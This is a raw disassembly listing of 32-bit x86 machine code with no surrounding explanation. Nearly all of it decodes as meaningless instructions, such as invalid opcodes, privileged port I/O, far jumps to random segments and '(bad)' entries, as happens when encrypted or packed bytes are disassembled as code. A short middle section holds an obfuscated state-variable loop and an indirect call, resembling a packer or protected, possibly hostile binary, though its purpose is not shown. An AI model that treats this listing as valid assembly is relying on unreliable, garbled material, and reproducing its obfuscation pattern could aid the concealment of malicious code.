  40bc75:	pop    ebx
  40bc76:	mov    cl,0xc1
  40bc78:	lods   eax,DWORD PTR ds:[esi]
  40bc79:	cli    
  40bc7a:	inc    ecx
  40bc7b:	ins    DWORD PTR es:[edi],dx
  40bc7c:	sbb    esi,DWORD PTR gs:[ebx+eiz*8-0x53]
  40bc81:	std    
  40bc82:	js     0x40bcee
  40bc84:	and    al,0x14
  40bc86:	lods   al,BYTE PTR ds:[esi]
  40bc87:	push   edi
  40bc88:	in     al,dx
  40bc89:	addr16 mov bl,0x6a
  40bc8c:	inc    edi
  40bc8d:	and    dl,BYTE PTR [ebx]
  40bc8f:	stc    
  40bc90:	push   ds
  40bc91:	jmp    0x40bc77
  40bc93:	xchg   edx,eax
  40bc94:	out    0x60,al
  40bc96:	shl    BYTE PTR [eax-0x64babc44],0x41
  40bc9d:	inc    edi
  40bc9e:	sti    
  40bc9f:	add    al,BYTE PTR [edx+edi*1]
  40bca2:	push   ebx
  40bca3:	(bad)  
  40bca5:	sti    
  40bca6:	push   esi
  40bca7:	or     eax,0x14c8dbf3
  40bcac:	nop
  40bcad:	jg     0x40bc90
  40bcaf:	cmc    
  40bcb0:	inc    esp
  40bcb1:	push   edi
  40bcb2:	jg     0x40bc5a
  40bcb4:	cmp    bh,BYTE PTR [edx+0x744bea33]
  40bcba:	sbb    BYTE PTR [edi+0x1d],cl
  40bcbd:	outs   dx,DWORD PTR ds:[esi]
  40bcbe:	out    dx,al
  40bcbf:	inc    esp
  40bcc0:	adc    DWORD PTR [edx],edi
  40bcc2:	mov    ch,0xf0
  40bcc4:	cmc    
  40bcc5:	bound  ecx,QWORD PTR [eax+0x567cf51f]
  40bccb:	mov    ebx,0x268d05e7
  40bcd0:	stos   BYTE PTR es:[edi],al
  40bcd1:	jecxz  0x40bc99
  40bcd3:	mov    dl,0x49
  40bcd5:	imul   esi,DWORD PTR [edx],0x45ad01ab
  40bcdb:	int3   
  40bcdc:	out    dx,al
  40bcdd:	xor    ebp,DWORD PTR [eax]
  40bcdf:	mov    edx,0x3a3beaf
  40bce4:	loope  0x40bc90
  40bce6:	add    ebp,esi
  40bce8:	push   eax
  40bce9:	int    0x84
  40bceb:	retf   0xe938
  40bcee:	sub    al,0x16
  40bcf0:	or     DWORD PTR [ebx+0x63],edi
  40bcf3:	fld    st(0)
  40bcf5:	xchg   ebx,eax
  40bcf6:	pop    ss
  40bcf7:	mov    al,0x14
  40bcf9:	(bad)  
  40bcfa:	loopne 0x40bca1
  40bcfc:	mov    edx,0x19134e8f
  40bd01:	mov    WORD PTR [edi],?
  40bd03:	lahf   
  40bd04:	neg    ebp
  40bd06:	adc    DWORD PTR [edx+eax*8+0x67],0xffffffa2
  40bd0b:	outs   dx,DWORD PTR ds:[esi]
  40bd0c:	gs in  eax,0x48
  40bd0f:	call   0x37f3:0xcd46101c
  40bd16:	test   BYTE PTR ds:0x6865eae7,ch
  40bd1c:	jmp    0x3c7a:0x10070ee6
  40bd23:	stc    
  40bd24:	xor    ch,BYTE PTR [edi-0x3c42c46e]
  40bd2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd2b:	inc    ecx
  40bd2c:	push   DWORD PTR [esi]
  40bd2e:	test   cl,bl
  40bd30:	push   si
  40bd32:	sub    eax,0xe437b04e
  40bd37:	out    dx,al
  40bd38:	mov    esp,DWORD PTR [eax+0x56]
  40bd3b:	stos   BYTE PTR es:[edi],al
  40bd3c:	mov    esp,0xf58eab8a
  40bd41:	into   
  40bd42:	push   cs
  40bd43:	sbb    ebp,ebx
  40bd45:	mov    ds:0xf79dadda,eax
  40bd4a:	hlt    
  40bd4b:	jmp    0xa8c61833
  40bd50:	and    edi,ecx
  40bd52:	adc    ch,BYTE PTR [ebx]
  40bd54:	dec    esp
  40bd55:	in     al,0x29
  40bd57:	adc    eax,0x168ab641
  40bd5c:	or     edi,DWORD PTR [edx+0x4a0e4d8e]
  40bd62:	repz cld 
  40bd64:	retf   
  40bd65:	jmp    0x1007:0xc7ed6ed3
  40bd6c:	ins    BYTE PTR es:[edi],dx
  40bd6d:	inc    esp
  40bd6e:	sti    
  40bd6f:	mov    dl,0xa8
  40bd71:	jmp    0xe238:0x156053b9
  40bd78:	pop    ebp
  40bd79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd7a:	dec    ebp
  40bd7b:	inc    ebx
  40bd7c:	or     al,0xbe
  40bd7e:	test   eax,0x91571c29
  40bd83:	xor    BYTE PTR [edx],bl
  40bd85:	dec    ebx
  40bd86:	shr    BYTE PTR [ecx-0x6e],0xf8
  40bd8a:	repz scas eax,DWORD PTR es:[edi]
  40bd8c:	cwde   
  40bd8d:	arpl   WORD PTR [edi+0x42363c07],bx
  40bd93:	in     eax,0x0
  40bd95:	push   ecx
  40bd96:	stc    
  40bd97:	mov    fs,WORD PTR [eax]
  40bd99:	pop    esi
  40bd9a:	xor    ecx,DWORD PTR [ecx]
  40bd9c:	fwait
  40bd9d:	icebp  
  40bd9e:	xor    BYTE PTR [eax+0x7bb0062f],bh
  40bda4:	fld    DWORD PTR [esi-0x1bacf1aa]
  40bdaa:	mov    cl,0x3b
  40bdac:	fdiv   DWORD PTR [edi+0x4c08d64a]
  40bdb2:	ins    BYTE PTR es:[edi],dx
  40bdb3:	inc    edi
  40bdb4:	jno    0x40be00
  40bdb6:	std    
  40bdb7:	inc    eax
  40bdb8:	push   es
  40bdb9:	les    ebp,FWORD PTR [ecx]
  40bdbb:	out    dx,eax
  40bdbc:	xchg   edx,eax
  40bdbd:	jp     0x40bde0
  40bdbf:	mov    al,ds:0xf2ca42d0
  40bdc4:	cmc    
  40bdc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc6:	push   ecx
  40bdc7:	in     eax,0x8c
  40bdc9:	or     BYTE PTR [edi-0x286bd837],ch
  40bdcf:	loope  0x40bd6a
  40bdd1:	imul   ebp,DWORD PTR [edi],0x92785d0e
  40bdd7:	push   ds
  40bdd8:	les    edx,FWORD PTR [esi]
  40bdda:	fucom  st(6)
  40bddc:	jns    0x40bd63
  40bdde:	sar    ch,cl
  40bde0:	cmc    
  40bde1:	rcr    BYTE PTR [edx+0x4dbd1893],cl
  40bde7:	mov    ecx,0xd9b22f28
  40bdec:	call   FWORD PTR [edi-0x1de144bf]
  40bdf2:	je     0x40bdcd
  40bdf4:	(bad)  
  40bdf5:	jb     0x40be75
  40bdf7:	cmc    
  40bdf8:	retf   
  40bdf9:	sbb    al,0x6c
  40bdfb:	xchg   ebp,eax
  40bdfc:	jmp    0x40bdc8
  40bdfe:	call   0x749705d5
  40be03:	push   esi
  40be04:	sbb    BYTE PTR [edi+ebx*2+0x6e0f6837],dh
  40be0b:	popf   
  40be0c:	pop    esp
  40be0d:	(bad)  
  40be0e:	cmp    ch,cl
  40be10:	jno    0x40be80
  40be12:	inc    ebx
  40be13:	pop    ss
  40be14:	adc    BYTE PTR [esi+0x5152fe03],ch
  40be1a:	inc    ebp
  40be1b:	dec    edx
  40be1c:	(bad)  
  40be1d:	mov    dl,0x1e
  40be1f:	(bad)  
  40be21:	(bad)  
  40be22:	adc    BYTE PTR [esi],al
  40be24:	dec    esp
  40be25:	(bad)  
  40be26:	out    dx,eax
  40be27:	xchg   esp,eax
  40be28:	leave  
  40be29:	outs   dx,BYTE PTR ds:[esi]
  40be2a:	push   esp
  40be2b:	aaa    
  40be2c:	ror    DWORD PTR [ecx+0x57c13bff],1
  40be32:	mov    dl,0x24
  40be34:	mov    ?,WORD PTR [bp+di]
  40be37:	push   ecx
  40be38:	xchg   DWORD PTR [ebx+0x362ee577],edx
  40be3e:	fidiv  WORD PTR [edi]
  40be40:	adc    BYTE PTR [eax+0x7c0cb656],0x21
  40be47:	fnstenv [edi]
  40be49:	ja     0x40be00
  40be4b:	xor    eax,DWORD PTR [ebx-0x119e436d]
  40be51:	jg     0x40be42
  40be53:	or     al,BYTE PTR ds:0xb1653c64
  40be59:	xor    DWORD PTR [edx+0x1610f403],eax
  40be5f:	jb     0x40be3e
  40be61:	cmp    eax,esi
  40be63:	popf   
  40be64:	je     0x40be6b
  40be66:	mov    dl,0x29
  40be68:	jl     0x40be1b
  40be6a:	mov    bl,0x8c
  40be6c:	das    
  40be6d:	sbb    DWORD PTR [eax-0xba3176e],eax
  40be73:	fild   WORD PTR [ecx]
  40be75:	pop    esi
  40be76:	push   ebx
  40be77:	xor    esi,ebx
  40be79:	push   edi
  40be7a:	xchg   ebp,eax
  40be7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be7c:	gs xchg edi,eax
  40be7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be80:	std    
  40be81:	das    
  40be82:	dec    ah
  40be84:	imul   esi,DWORD PTR [edx],0xf013eae0
  40be8a:	call   0x81d422b6
  40be8f:	cmc    
  40be90:	sbb    eax,edi
  40be92:	cmp    DWORD PTR [esp+ebx*4-0x32],edi
  40be96:	and    BYTE PTR [esi-0x33],cl
  40be99:	mov    ebp,0x2599f213
  40be9e:	addr16 xor ebp,esp
  40bea1:	cwde   
  40bea2:	mov    edi,0x9941c7b0
  40bea7:	push   ebp
  40bea8:	or     eax,0x89544ee8
  40bead:	fisubr DWORD PTR [eax+edi*1-0x75]
  40beb1:	jge    0x40bebb
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	int3   
  40c013:	or     al,0x3b
  40c015:	pushf  
  40c016:	aam    0xe9
  40c018:	jp     0x40c094
  40c01a:	sbb    DWORD PTR [edi+0x7a],ebx
  40c01d:	jp     0x40c041
  40c01f:	out    dx,al
  40c020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c021:	arpl   WORD PTR [edi+0x4f743abd],bp
  40c027:	and    ch,BYTE PTR [ecx]
  40c029:	pop    esp
  40c02a:	cmp    al,0xea
  40c02c:	cs sti 
  40c02e:	xor    BYTE PTR [edi+0x1e],dl
  40c031:	jno    0x40c03a
  40c033:	repnz sbb BYTE PTR [esi],cl
  40c036:	mov    eax,0xb066c897
  40c03b:	or     BYTE PTR [ecx],ch
  40c03d:	mov    ah,0xd0
  40c03f:	jge    0x40c0c0
  40c041:	lock loope 0x40bfc4
  40c044:	or     BYTE PTR [esi+0x59],bl
  40c047:	pop    edx
  40c048:	imul   ch
  40c04a:	fwait
  40c04b:	mov    ds:0xa0799089,al
  40c050:	lods   eax,DWORD PTR ds:[esi]
  40c051:	jg     0x40c07c
  40c053:	(bad)  
  40c054:	inc    ebx
  40c055:	imul   eax,DWORD PTR [ecx-0x3a9477e1],0x5a245c27
  40c05f:	add    BYTE PTR [ebx],bl
  40c061:	pop    esp
  40c062:	inc    esp
  40c063:	pusha  
  40c064:	dec    ebx
  40c065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c066:	xchg   ebx,eax
  40c067:	push   cs
  40c068:	or     eax,0x24d0d96a
  40c06d:	ret    
  40c06e:	fidiv  DWORD PTR [edx-0x764e6b99]
  40c074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c075:	gs call 0xbd85:0xea06738b
  40c07d:	mov    bl,0x1c
  40c07f:	rcr    BYTE PTR ds:0xf2e8dabf,1
  40c085:	cli    
  40c086:	mov    dl,dl
  40c088:	push   esi
  40c089:	pop    ss
  40c08a:	sbb    cl,dh
  40c08c:	mov    edi,DWORD PTR [ecx+0x19cc537d]
  40c092:	mov    ebx,0xeafed077
  40c097:	idiv   BYTE PTR [edx]
  40c099:	(bad)  
  40c09b:	xchg   DWORD PTR [eax-0x76162590],ebp
  40c0a1:	sub    bh,BYTE PTR [edx]
  40c0a3:	(bad)  
  40c0a4:	pop    edi
  40c0a5:	fcomp  QWORD PTR [ebp+0x721f9584]
  40c0ab:	fidiv  WORD PTR [esi+0x2a4f1d86]
  40c0b1:	(bad)  
  40c0b2:	jmp    0x40c0fd
  40c0b4:	out    dx,eax
  40c0b5:	repnz inc ecx
  40c0b7:	lahf   
  40c0b8:	popf   
  40c0b9:	push   ebx
  40c0ba:	push   0x1c0bf034
  40c0bf:	rcr    DWORD PTR [eax+0xe],cl
  40c0c2:	sbb    al,0x6d
  40c0c4:	shl    eax,cl
  40c0c6:	aad    0xaf
  40c0c8:	sub    dl,0x29
  40c0cb:	adc    BYTE PTR [eax],0x63
  40c0ce:	mov    eax,ds:0xd4eefe46
  40c0d3:	mov    es,WORD PTR [eax]
  40c0d5:	test   DWORD PTR [eax-0x7292371d],0xf921bbae
  40c0df:	sbb    al,0x56
  40c0e1:	sbb    ebx,DWORD PTR ds:0x1bfca59d
  40c0e7:	ins    BYTE PTR es:[edi],dx
  40c0e8:	arpl   WORD PTR [ecx],sp
  40c0ea:	dec    ebx
  40c0eb:	add    DWORD PTR [esi-0x63],0xffffffd8
  40c0ef:	das    
  40c0f0:	ret    0x3d6b
  40c0f3:	nop
  40c0f4:	sub    ecx,DWORD PTR [eax]
  40c0f6:	sbb    BYTE PTR [ecx+ebx*8],dh
  40c0f9:	dec    edx
  40c0fa:	(bad)  
  40c0fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0fc:	fs xor ebx,eax
  40c0ff:	imul   ebx,DWORD PTR [edx+0x408640ee],0xae9ad848
  40c109:	sbb    eax,0x43f89d37
  40c10e:	push   0xa4ecc04c
  40c113:	stos   DWORD PTR es:[edi],eax
  40c114:	xor    BYTE PTR [edx+0x4ff811eb],0x28
  40c11b:	in     al,0x7
  40c11d:	aad    0xb3
  40c11f:	test   eax,0xf4191564
  40c124:	cwde   
  40c125:	inc    edi
  40c126:	xchg   DWORD PTR [edi-0x11],ecx
  40c129:	add    al,0x3f
  40c12b:	inc    edx
  40c12c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c12d:	add    al,0xd3
  40c12f:	adc    eax,0xbcde8b1f
  40c134:	sub    DWORD PTR [eax],esp
  40c136:	adc    al,0x4f
  40c138:	fdiv   QWORD PTR [ecx]
  40c13a:	push   0xffffffbd
  40c13c:	bound  eax,QWORD PTR [esi+0x6e84fe4b]
  40c142:	and    DWORD PTR [ecx-0x5db65b8a],0x744555b9
  40c14c:	lods   al,BYTE PTR ds:[esi]
  40c14d:	mov    esi,0x74bb25fe
  40c152:	dec    ecx
  40c153:	call   0x29e:0x84210a37
  40c15a:	sbb    bh,BYTE PTR [edx+0xd09e906]
  40c160:	pop    edx
  40c161:	mov    ecx,0x778be181
  40c166:	scas   al,BYTE PTR es:[edi]
  40c167:	sbb    DWORD PTR [eax],edi
  40c169:	push   ss
  40c16a:	call   0xea38:0x9cc33f8b
  40c171:	jge    0x40c1dc
  40c173:	adc    bh,dl
  40c175:	into   
  40c176:	clc    
  40c177:	jecxz  0x40c13d
  40c179:	mov    esp,0x4db0c058
  40c17e:	mov    WORD PTR [eax+0x7ad96fe3],?
  40c184:	in     eax,dx
  40c185:	jle    0x40c167
  40c187:	jmp    DWORD PTR [esi]
  40c189:	sbb    al,0xf1
  40c18b:	loope  0x40c135
  40c18d:	fbstp  TBYTE PTR [eax-0x12]
  40c190:	xor    al,bl
  40c192:	xor    eax,0xf0483ab4
  40c197:	int3   
  40c198:	pusha  
  40c199:	xor    DWORD PTR ds:0x2f2912db,ecx
  40c19f:	sbb    eax,0x10ff3b86
  40c1a4:	fwait
  40c1a5:	inc    edi
  40c1a6:	sub    al,0xd
  40c1a8:	ins    DWORD PTR es:[edi],dx
  40c1a9:	sti    
  40c1aa:	stos   BYTE PTR es:[edi],al
  40c1ab:	dec    eax
  40c1ac:	ret    0x825
  40c1af:	nop
  40c1b0:	jo     0x40c145
  40c1b2:	sbb    ch,BYTE PTR [ebp+0x4b]
  40c1b5:	rcr    ah,0x58
  40c1b8:	cmp    ah,ch
  40c1ba:	cmc    
  40c1bb:	pusha  
  40c1bc:	fnsave [edx+0x33]
  40c1bf:	adc    DWORD PTR [ecx],ebx
  40c1c1:	push   0xffffffa7
  40c1c3:	scas   al,BYTE PTR es:[edi]
  40c1c4:	pop    ecx
  40c1c5:	fcmove st,st(3)
  40c1c7:	cli    
  40c1c8:	int3   
  40c1c9:	xchg   esp,eax
  40c1cb:	int    0x10
  40c1cd:	mov    cl,0x2b
  40c1cf:	xchg   esp,eax
  40c1d0:	repz adc DWORD PTR [eax],ebp
  40c1d3:	lahf   
  40c1d4:	lock test al,0xfc
  40c1d7:	or     al,0x79
  40c1d9:	inc    edx
  40c1da:	arpl   WORD PTR [edi],sp
  40c1dc:	sbb    ecx,DWORD PTR [ebp+ebx*4-0x220b9885]
  40c1e3:	lahf   
  40c1e4:	pop    es
  40c1e5:	mov    edi,0xe51d011b
  40c1ea:	dec    edi
  40c1eb:	add    al,0x18
  40c1ed:	push   0xc45f6f29
  40c1f2:	adc    edx,DWORD PTR [edx+0xea83ddf]
  40c1f8:	repz loope 0x40c1da
  40c1fb:	(bad)  
  40c1fc:	aam    0xb9
  40c1fe:	and    eax,0x1197841c
  40c203:	lea    ebp,[ebp-0x57]
  40c206:	ins    BYTE PTR es:[edi],dx
  40c207:	mov    bh,0x6c
  40c209:	pop    esi
  40c20a:	jo     0x40c1ac
  40c20c:	pusha  
  40c20d:	jae    0x40c208
  40c20f:	das    
  40c210:	sbb    dh,BYTE PTR [esi]
  40c212:	fsubr  QWORD PTR [edx-0x5e9ce594]
  40c218:	sub    DWORD PTR [edx+0x51d716dd],0x5546db80
  40c222:	mov    eax,DWORD PTR [ecx]
  40c224:	add    dl,dh
  40c226:	faddp  st(3),st
  40c228:	or     dl,0x20
  40c22b:	out    0x55,al
  40c22d:	sahf   
  40c22e:	fwait
  40c22f:	sar    BYTE PTR [ebx],1
  40c231:	imul   edx,DWORD PTR [edx],0xa41184b6
  40c237:	jge    0x40c220
  40c239:	pushf  
  40c23a:	fwait
  40c23b:	jnp    0x40c1ec
  40c23d:	inc    eax
  40c23e:	adc    al,0xf2
  40c240:	add    al,0x1b
  40c242:	lods   al,BYTE PTR ds:[esi]
  40c243:	and    al,0x53
  40c245:	call   0x748e6f6b
  40c24a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24c:	inc    edi
  40c24d:	in     al,0x7c
  40c24f:	jno    0x40c22b
  40c251:	ret    0xa99c
  40c254:	adc    DWORD PTR [ecx-0x62],ebp
  40c257:	stos   BYTE PTR es:[edi],al
  40c258:	daa    
  40c259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c25a:	fidiv  DWORD PTR [ecx-0x59479c46]
  40c260:	inc    esi
  40c261:	sub    BYTE PTR [ebx+0x3b3e9bf3],dh
  40c267:	pop    ebp
  40c268:	aas    
  40c269:	mov    ah,0x5f
  40c26b:	test   eax,0xd8c6878f
  40c270:	lods   al,BYTE PTR ds:[esi]
  40c271:	jno    0x40c2e1
  40c273:	push   es
  40c274:	jl     0x40c2d8
  40c276:	sbb    eax,0x81ee7169
  40c27b:	pop    edx
  40c27c:	daa    
  40c27d:	mov    ds:0x5912f34c,eax
  40c282:	ficom  DWORD PTR [ebx-0x44]
  40c285:	call   0x231e:0x19c2b01
  40c28c:	scas   eax,DWORD PTR es:[di]
  40c28e:	mov    ah,0x63
  40c290:	push   ds
  40c291:	sub    edi,DWORD PTR [edi-0x36]
  40c294:	push   ecx
  40c295:	inc    edi
  40c296:	bound  ecx,QWORD PTR [edi+eax*8-0x4d55fcd]
  40c29d:	out    0x33,eax
  40c29f:	(bad)  
  40c2a0:	(bad)  [edi]
  40c2a2:	out    0x30,al
  40c2a4:	mov    cl,0x74
  40c2a6:	dec    esp
  40c2a7:	loope  0x40c311
  40c2a9:	mov    ecx,0x51653821
  40c2ae:	pusha  
  40c2af:	push   ds
  40c2b0:	ds cs (bad) 
  40c2b4:	push   cs
  40c2b5:	mov    ecx,0x103ac4d0
  40c2ba:	xor    edi,edx
  40c2bc:	out    0x73,eax
  40c2be:	call   0xc379:0x4efe8762
  40c2c5:	pop    eax
  40c2c6:	mov    ebx,0xaed8737
  40c2cb:	sbb    al,0xa8
  40c2cd:	not    DWORD PTR [ecx]
  40c2cf:	jp     0x40c263
  40c2d1:	stos   DWORD PTR es:[edi],eax
  40c2d2:	xor    ebp,esp
  40c2d4:	cmp    al,0xf8
  40c2d6:	cmp    ecx,DWORD PTR [esi-0x3f]
  40c2d9:	jae    0x40c340
  40c2db:	aas    
  40c2dc:	mov    ss,WORD PTR [edx+0x14f0c62a]
  40c2e2:	sbb    eax,0xbbdbf929
  40c2e7:	fcmove st,st(1)
  40c2e9:	sub    dl,BYTE PTR [ebp-0x79f57dcc]
  40c2ef:	fmul   QWORD PTR cs:[edi+ebp*4]
  40c2f3:	pop    es
  40c2f4:	jne    0x40c2fd
  40c2f6:	call   0x1dc6e5d4
  40c2fb:	add    BYTE PTR [edx-0x3d9e8a5],0x73
  40c302:	aas    
  40c303:	shr    DWORD PTR [ecx-0x5],0xbe
  40c307:	outs   dx,DWORD PTR ds:[esi]
  40c308:	add    BYTE PTR [esi],bh
  40c30a:	dec    BYTE PTR [ecx-0x3d386785]
  40c310:	leave  
  40c311:	cmp    bl,BYTE PTR [esi+0x7e]
  40c314:	div    DWORD PTR [edx]
  40c316:	xor    ah,bh
  40c318:	stc    
  40c319:	mov    dl,0x18
  40c31b:	popa   
  40c31c:	(bad)  
  40c31d:	fcom   QWORD PTR [ebx-0x33]
  40c320:	int3   
  40c321:	scas   al,BYTE PTR es:[edi]
  40c322:	retf   
  40c323:	push   esp
  40c324:	icebp  
  40c325:	retf   0x746d
  40c328:	add    bh,ch
  40c32a:	cli    
  40c32b:	ror    esp,cl
  40c32d:	xchg   ebx,eax
  40c32e:	out    dx,eax
  40c32f:	das    
  40c330:	adc    ecx,ebp
  40c332:	add    ecx,DWORD PTR [edi-0x26]
  40c335:	and    DWORD PTR ds:0x9bbfd25a,edi
  40c33b:	push   ebp
  40c33c:	inc    eax
  40c33d:	sbb    edi,eax
  40c33f:	xor    DWORD PTR [ecx+0x7],ecx
  40c342:	inc    edx
  40c343:	mov    eax,ds:0x6d4cd5c
  40c348:	scas   eax,DWORD PTR es:[edi]
  40c349:	push   ebp
  40c34a:	pop    es
  40c34b:	js     0x40c33c
  40c34d:	mov    dl,0x6a
  40c34f:	loopne 0x40c2f9
  40c351:	xor    DWORD PTR [ebx-0x71],edi
  40c354:	shl    DWORD PTR [esi-0x29f27804],0xe3
  40c35b:	je     0x40c359
  40c35d:	add    esp,DWORD PTR [edx+ebx*1]
  40c360:	and    ebp,DWORD PTR [ebx]
  40c362:	push   ebx
  40c363:	or     DWORD PTR [eax-0x2b875668],ecx
  40c369:	dec    ecx
  40c36a:	jae    0x40c32f
  40c36c:	jnp    0x40c3b7
  40c36e:	mov    ch,0x6f
  40c370:	shr    DWORD PTR [edi],1
  40c372:	jle    0x40c305
  40c374:	imul   esp,DWORD PTR [ebp+0x1c],0xfc7b77d3
  40c37b:	out    dx,al
  40c37c:	outs   dx,DWORD PTR ds:[esi]
  40c37d:	mov    bh,0x3a
  40c37f:	sar    BYTE PTR [eax-0xf735691],cl
  40c385:	mov    al,ds:0x3a06e70d
  40c38a:	in     al,dx
  40c38b:	test   BYTE PTR [ecx],dh
  40c38d:	int3   
  40c38e:	jne    0x40c3c0
  40c390:	js     0x40c38e
  40c392:	das    
  40c393:	nop
  40c394:	inc    ecx
  40c395:	repz daa 
  40c397:	call   0x161d:0x948f8015
  40c39e:	ret    
  40c39f:	xchg   ecx,eax
  40c3a0:	retf   
  40c3a1:	(bad)  
  40c3a2:	in     eax,0x30
  40c3a4:	xchg   esi,eax
  40c3a5:	xchg   DWORD PTR [esp+edx*4-0x67],ebp
  40c3a9:	or     al,0xe5
  40c3ab:	mov    DWORD PTR [ebp-0x57794669],ecx
  40c3b1:	dec    ebp
  40c3b2:	push   ebp
  40c3b3:	add    DWORD PTR [ecx+0x78],ebp
  40c3b6:	and    ebx,ebp
  40c3b8:	inc    ebp
  40c3b9:	xor    al,0xa7
  40c3bb:	repz neg esp
  40c3be:	jo     0x40c411
  40c3c0:	jae    0x40c3fa
  40c3c2:	inc    edi
  40c3c3:	test   DWORD PTR [edx+0x1cafde3e],edx
  40c3c9:	cmp    ch,BYTE PTR [esi+0x5]
  40c3cc:	and    DWORD PTR [eax+eiz*4],ebx
  40c3cf:	pop    es
  40c3d0:	sub    DWORD PTR [ecx-0x4cbc3ee1],esi
  40c3d6:	mov    edi,0xb1db7c2
  40c3db:	push   ss
  40c3dc:	jmp    0x40c3ce
  40c3de:	cmc    
  40c3df:	lahf   
  40c3e0:	mov    esi,0xea64edcb
  40c3e5:	push   edi
  40c3e6:	add    eax,0x3929afb7
  40c3eb:	and    BYTE PTR [edi+0x229e1e6d],bl
  40c3f1:	test   al,0xe9
  40c3f3:	outs   dx,BYTE PTR ds:[esi]
  40c3f4:	ret    
  40c3f5:	cmp    BYTE PTR [edx+0x5d],al
  40c3f8:	fwait
  40c3f9:	xor    eax,0x1f0f70d4
  40c3fe:	pop    ebx
  40c3ff:	test   eax,0x8ce07f49
  40c404:	push   ds
  40c405:	add    eax,0x76e1f962
  40c40a:	mov    esi,0xf699132b
  40c40f:	test   ah,bl
  40c411:	ret    0xe5f5
  40c414:	add    eax,0x7c79138a
  40c419:	add    BYTE PTR [eax],ah
  40c41b:	mov    esi,0x3cb71bf3
  40c420:	je     0x40c3da
  40c422:	repz sub al,0x47
  40c425:	mov    bh,0xb8
  40c427:	or     ch,BYTE PTR [ebx]
  40c429:	dec    ebx
  40c42a:	mov    ds:0x247c1ff4,eax
  40c42f:	bound  ebx,QWORD PTR [edi]
  40c431:	pop    ds
  40c432:	or     BYTE PTR [esi+0x60433ac4],cl
  40c438:	and    bh,BYTE PTR [ecx+0x60954869]
  40c43e:	xor    bl,BYTE PTR [eax-0x60ec63a2]
  40c444:	mov    eax,0xa6b0f703
  40c449:	cmc    
  40c44a:	cmp    ecx,DWORD PTR [edi]
  40c44c:	sbb    eax,0x4aebc7e9
  40c451:	adc    eax,0xbbeea953
  40c456:	mov    eax,0x4ff269c7
  40c45b:	cmp    al,0x16
  40c45d:	ror    DWORD PTR [esi+eiz*8-0xf6c1c91],0xfc
  40c465:	lods   al,BYTE PTR ds:[esi]
  40c466:	hlt    
  40c467:	sub    dl,BYTE PTR [edi-0x73]
  40c46a:	lock out dx,eax
  40c46c:	dec    esi
  40c46d:	push   ebx
  40c46e:	stos   DWORD PTR es:[edi],eax
  40c46f:	int3   
  40c470:	mov    cl,0x4b
